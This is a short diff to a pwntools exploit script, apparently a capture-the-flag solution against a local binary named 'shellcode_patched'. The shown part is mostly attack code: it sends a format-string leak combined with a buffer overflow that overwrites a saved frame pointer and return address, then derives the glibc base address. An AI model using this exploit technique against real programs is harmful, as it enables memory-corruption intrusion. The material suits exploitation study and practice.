@@ -16,8 +16,8 @@ p = gdb.debug('./shellcode_patched', '''
 # from <main+00f0> to <main+00f7) (0x400706-0x40070d): mov rax, QWORD PTR [rbp-0x10]; add rax, rdx; movzx eax, BYTE PTR [rax];
 # ensuring rdx=0 within these instructions, qword data at rbp-0x10 has to be an available address
 FAKE_RBP_MINUS_HEX_10 = 0x601800
-MAIN_USABLE = 0x40061a
-p.sendlineafter(b"<Insert prompt here>: \n", b'%3$p'+b'\0'*(0x30-4)+p64(FAKE_RBP_MINUS_HEX_10)+b'\0'*0x10+p64(MAIN_USABLE))
+MAIN = 0x400616
+p.sendlineafter(b"<Insert prompt here>: \n", b'%3$p'+b'\0'*(0x30-4)+p64(FAKE_RBP_MINUS_HEX_10)+b'\0'*0x10+p64(MAIN))
 glibc_base_addr = int(p.recv(14), 16)-0x3c48e0
 log.info(f"glibc base addr: {hex(glibc_base_addr)}")
 
